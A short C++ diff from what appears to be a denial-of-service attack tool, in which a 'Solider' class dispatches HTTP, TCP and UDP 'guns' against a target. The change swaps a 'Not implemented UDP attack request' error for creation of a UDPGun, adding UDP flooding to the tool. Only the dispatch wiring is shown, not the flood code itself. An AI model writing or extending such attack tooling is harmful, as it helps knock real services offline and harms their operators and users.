@@ -2,7 +2,7 @@
 
 #include "http_gun.h"
 #include "tcp_gun.h"
-#include "globals.h"
+#include "udp_gun.h"
 
 void Solider::ExecuteOrders(const TaskController &task, Attackers::Target &target)
 {
@@ -39,7 +39,7 @@ void Solider::ExecuteOrders(const TaskController &task, Attackers::Target &targe
 			case Attackers::AttackMethod::UDPAttack:
 			default:
 			{
-				SPDLOG_ERROR("Not implemented UDP attack request");
+				gun = std::make_unique<Attackers::UDPGun>(task);
 				break;
 			}
 		}
